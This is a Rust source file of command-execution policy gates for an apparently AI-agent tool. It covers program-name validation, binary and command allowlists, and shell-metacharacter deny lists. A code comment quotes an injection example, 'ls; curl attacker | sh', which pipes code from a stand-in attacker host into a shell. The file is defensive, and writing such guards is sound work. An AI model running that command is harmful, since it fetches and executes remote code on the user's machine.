//! The `run_command` policy gates: program-name validation, the shell
//! script / command / binary allowlists, and the order they run in.

use super::args::RunArgs;
use crate::error::ToolError;
use crate::tool::ToolContext;
use std::path::Path;

/// Reject any program name that could be interpreted as a shell command.
///
/// Used to keep [`cmd_spawn`](super::cmd_spawn) safe: even though the default path no
/// longer wraps invocations in `sh -c` / `cmd.exe /C`, a hostile caller
/// could still embed metacharacters in `program` and hope the OS falls
/// back to shell resolution (`CreateProcessW` on Windows, `posix_spawn`
/// on Unix). Rejecting these characters up front guarantees that what
/// the caller typed is a bare executable name or path.
///
/// Rejects:
/// - Empty strings
/// - Control characters (`< 0x20` or `0x7F`)
/// - ASCII whitespace (space, tab)
/// - Shell metacharacters: `;`, `&`, `|`, `>`, `<`, `$`, backtick, `\`,
///   `(`, `)`, `{`, `}`, `[`, `]`, `*`, `?`, `#`, `'`, `"`, `\n`, `\r`
///
/// On violation returns [`ToolError::InvalidArguments`] describing the
/// offending character.
pub(super) fn validate_program_name(program: &str) -> Result<(), ToolError> {
    if program.is_empty() {
        return Err(ToolError::InvalidArguments(
            "program must not be empty".into(),
        ));
    }
    for c in program.chars() {
        let code = c as u32;
        let is_ctrl = code < 0x20 || code == 0x7F;
        let is_ws = c == ' ' || c == '\t';
        let is_meta = matches!(
            c,
            ';' | '&'
                | '|'
                | '>'
                | '<'
                | '$'
                | '`'
                | '\\'
                | '('
                | ')'
                | '{'
                | '}'
                | '['
                | ']'
                | '*'
                | '?'
                | '#'
                | '\''
                | '"'
                | '\n'
                | '\r'
        );
        if is_ctrl || is_ws || is_meta {
            return Err(ToolError::InvalidArguments(format!(
                "program '{program}' contains disallowed character {c:?}; \
                 use the 'shell_script' field for shell-quoted scripts"
            )));
        }
    }
    Ok(())
}

/// Strip a Windows-style executable suffix (`.exe`, `.cmd`, `.bat`) from a
/// resolved binary file name, case-insensitively, so allow-list entries can
/// stay platform-agnostic.
///
/// `"git"` matches both `git` and `git.exe`; `"npm"` matches `npm.cmd`
/// (the shim `which` returns for Node-tooling on Windows); `"npx"` matches
/// `npx.cmd`; analogous for `pnpm`/`yarn`/`tsc`/etc. Without this, the
/// resolved Windows shim file name (`npm.cmd`) never matches a bare
/// allow-list entry (`npm`), and the harness rejects valid invocations
/// with `Forbidden(npm.cmd)`.
pub(super) fn strip_windows_executable_suffix(name: &str) -> &str {
    const SUFFIXES: &[&str] = &[".exe", ".cmd", ".bat"];
    for suffix in SUFFIXES {
        if name.len() > suffix.len() {
            let (head, tail) = name.split_at(name.len() - suffix.len());
            if tail.eq_ignore_ascii_case(suffix) {
                return head;
            }
        }
    }
    name
}

/// Resolve `program` through `which` and check its file name against
/// `allowlist`.
///
/// Distinct from [`check_command_allowlist`], which matches the raw user
/// string: binary allow-listing defeats PATH-shadowing attacks because we
/// compare the **resolved executable file name** rather than whatever the
/// caller typed. Called *before* [`cmd_spawn`](super::cmd_spawn) in `run_command`.
///
/// This function now fails **closed**: when command execution is enabled
/// and `allowlist` is empty, the caller's config is considered
/// mis-configured and the call is rejected with
/// [`ToolError::Forbidden`]. Previously an empty list short-circuited to
/// "allowed", which left the command-execution tool effectively
/// unrestricted by default. (Phase 2 hardening.)
///
/// When command execution is disabled the allow-list check is skipped
/// because the dispatcher will have already refused the tool call at a
/// higher level.
pub(super) fn check_binary_allowlist(
    program: &str,
    command_enabled: bool,
    bypass_allowlists: bool,
    allowlist: &[String],
) -> Result<(), ToolError> {
    if !command_enabled {
        return Ok(());
    }

    if bypass_allowlists {
        return Ok(());
    }

    if allowlist.is_empty() {
        return Err(ToolError::Forbidden(
            "command execution requires a non-empty binary_allowlist; \
             configure ToolConfig::command.binary_allowlist"
                .into(),
        ));
    }

    if Path::new(program).components().count() == 1
        && !allowlist
            .iter()
            .any(|allowed| allowed == strip_windows_executable_suffix(program))
    {
        return Err(ToolError::Forbidden(format!(
            "program '{program}' is not present in ToolConfig::command.binary_allowlist"
        )));
    }

    // When the caller already passes an absolute/relative path, honor it;
    // otherwise resolve via PATH. `which` handles the Windows `.exe`
    // extension normalization for us.
    let resolved = if Path::new(program).components().count() > 1 {
        Path::new(program).to_path_buf()
    } else {
        which::which(program).map_err(|e| {
            ToolError::Forbidden(format!("could not resolve program '{program}': {e}"))
        })?
    };

    let file_name = resolved
        .file_name()
        .and_then(|s| s.to_str())
        .map(|s| strip_windows_executable_suffix(s).to_string())
        .ok_or_else(|| {
            ToolError::Forbidden(format!("program '{program}' resolved to a non-UTF-8 path"))
        })?;

    if allowlist.iter().any(|a| a == &file_name) {
        Ok(())
    } else {
        Err(ToolError::Forbidden(file_name))
    }
}

/// Validate a command string against the allowlist.
///
/// When the allowlist is non-empty, the command must match at least one entry.
/// Single-token entries match the first token of the command (program name).
/// Multi-token entries (containing whitespace) match as a prefix of the full
/// command, enabling rules like `"start obsidian://"` that restrict both the
/// program and its arguments. Shell metacharacters that could chain additional
/// commands are rejected.
pub(super) fn check_command_allowlist(
    command: &str,
    bypass_allowlists: bool,
    allowlist: &[String],
) -> Result<(), ToolError> {
    if bypass_allowlists {
        return Ok(());
    }

    if allowlist.is_empty() {
        return Ok(());
    }

    let dangerous: &[&str] = if cfg!(windows) {
        &[";", "&&", "||", "|", "$(", "`", "\n", "&", ">", "<", "^"]
    } else {
        &[";", "&&", "||", "|", "$(", "`", "\n", ">", "<", "<("]
    };
    for meta in dangerous {
        if command.contains(meta) {
            return Err(ToolError::CommandNotAllowed(format!(
                "shell metacharacter '{meta}' not allowed"
            )));
        }
    }

    let program = command.split_whitespace().next().unwrap_or(command);
    let allowed = allowlist.iter().any(|a| {
        if a.contains(' ') {
            command.starts_with(a.as_str())
        } else {
            a == program
        }
    });
    if !allowed {
        return Err(ToolError::CommandNotAllowed(program.into()));
    }
    Ok(())
}

/// Apply every policy gate to a parsed [`RunArgs`].
///
/// Mirrors the original inline ordering exactly so error messages don't
/// shift between releases:
/// 1. `command.enabled = false` is the outermost gate (Phase 5 hardening
///    — refuses even when a caller reaches `CmdRunTool` directly,
///    bypassing `ToolExecutor`'s category-level gate).
/// 2. Shell-script branch: `allow_shell`, mutual-exclusion with
///    `program` / `args`, `allowed_shell_scripts`,
///    `command_allowlist`, then `binary_allowlist` against the first
///    token (so an operator who's narrowed those lists sees consistent
///    behavior with the direct-execution path).
/// 3. Direct branch: presence of `program`, `validate_program_name`
///    (rejects injection attempts before `which` masquerades them as
///    `Forbidden`), then `command_allowlist` and `binary_allowlist`.
pub(super) fn enforce_command_policy(args: &RunArgs, ctx: &ToolContext) -> Result<(), ToolError> {
    if !ctx.config.command.enabled {
        return Err(ToolError::Forbidden(
            "command execution disabled; set ToolConfig::command.enabled=true \
             and populate binary_allowlist to opt in"
                .into(),
        ));
    }

    // Every push goes through the push tools and the merge queue, at any
    // approval level.
    super::push_guard::refuse_raw_push(
        args.program.as_deref(),
        &args.cmd_args,
        args.shell_script.as_deref(),
    )?;

    // A command confined to writing in the workspace (the `yolo` approval
    // level) is already bounded by the confinement, not by which binary
    // it starts with.
    let bypass_allowlists = ctx.config.command.bypass_allowlists || ctx.confine_writes;

    match &args.shell_script {
        Some(script) => enforce_shell_script_policy(script, args, ctx, bypass_allowlists),
        None => enforce_program_policy(args, ctx, bypass_allowlists),
    }
}

/// The shell-script branch of [`enforce_command_policy`].
fn enforce_shell_script_policy(
    script: &str,
    args: &RunArgs,
    ctx: &ToolContext,
    bypass_allowlists: bool,
) -> Result<(), ToolError> {
    if !args.allow_shell {
        return Err(ToolError::InvalidArguments(
            "'shell_script' requires allow_shell=true (per-call or in ToolConfig)".into(),
        ));
    }
    if args.program.is_some() || !args.cmd_args.is_empty() {
        return Err(ToolError::InvalidArguments(
            "'shell_script' is mutually exclusive with 'program' / 'args'".into(),
        ));
    }
    // Empty `allowed_shell_scripts` means "all shell scripts
    // allowed" once `allow_shell == true` has been granted, to
    // match the documented empty-allowlist convention shared
    // with `command_allowlist` and `binary_allowlist`. A
    // non-empty list switches back to strict verbatim-match
    // enforcement so operators who pin specific scripts keep
    // the original behavior.
    if !bypass_allowlists
        && !ctx.config.command.allowed_shell_scripts.is_empty()
        && !ctx
            .config
            .command
            .allowed_shell_scripts
            .iter()
            .any(|s| s == script)
    {
        return Err(ToolError::Forbidden(
            "shell_script not present in ToolConfig::command.allowed_shell_scripts; \
             operator must opt in by listing the script verbatim"
                .into(),
        ));
    }
    check_command_allowlist(
        script,
        bypass_allowlists,
        &ctx.config.command.command_allowlist,
    )?;
    if let Some(first) = script_program(script) {
        check_binary_allowlist(
            first,
            ctx.config.command.enabled,
            bypass_allowlists,
            &ctx.config.command.binary_allowlist,
        )?;
    }
    Ok(())
}

/// The direct-execution branch of [`enforce_command_policy`].
fn enforce_program_policy(
    args: &RunArgs,
    ctx: &ToolContext,
    bypass_allowlists: bool,
) -> Result<(), ToolError> {
    let program = args.program.as_deref().ok_or_else(|| {
        ToolError::InvalidArguments(
            "missing 'program' argument; use 'shell_script' for shell commands".into(),
        )
    })?;

    // Validate the raw string BEFORE the allow-list checks so that
    // injection attempts (`"ls; curl attacker | sh"`) surface as
    // `InvalidArguments` rather than a downstream `which` failure
    // masquerading as `Forbidden`.
    validate_program_name(program)?;

    check_command_allowlist(
        program,
        bypass_allowlists,
        &ctx.config.command.command_allowlist,
    )?;
    check_binary_allowlist(
        program,
        ctx.config.command.enabled,
        bypass_allowlists,
        &ctx.config.command.binary_allowlist,
    )?;

    Ok(())
}

/// Shell builtins and keywords a script may start with; they run inside
/// the shell, so there is no binary to allowlist.
const SHELL_BUILTINS: &[&str] = &[
    "!", ".", ":", "[", "alias", "case", "cd", "command", "echo", "eval", "exec", "exit", "export",
    "false", "for", "if", "local", "popd", "printf", "pushd", "pwd", "read", "set", "shift",
    "source", "test", "time", "trap", "true", "type", "ulimit", "umask", "unset", "until", "wait",
    "while", "{",
];

/// The binary a shell script starts with, for the binary allowlist:
/// leading `NAME=value` assignments and subshell parentheses are skipped,
/// and a script starting with a shell builtin has none.
pub(super) fn script_program(script: &str) -> Option<&str> {
    let word = script
        .split_whitespace()
        .map(|word| word.trim_start_matches('('))
        .find(|word| !word.is_empty() && !is_env_assignment(word))?;
    (!SHELL_BUILTINS.contains(&word)).then_some(word)
}

fn is_env_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        let mut chars = name.chars();
        chars
            .next()
            .is_some_and(|c| c == '_' || c.is_ascii_alphabetic())
            && chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
    })
}

/// Whether `program` names a shell interpreter, as models sometimes pass
/// alongside a `shell_script`.
pub(super) fn is_shell_program(program: &str) -> bool {
    let name = Path::new(program)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(program);
    matches!(
        strip_windows_executable_suffix(name),
        "sh" | "bash" | "zsh" | "dash" | "cmd" | "powershell" | "pwsh"
    )
}
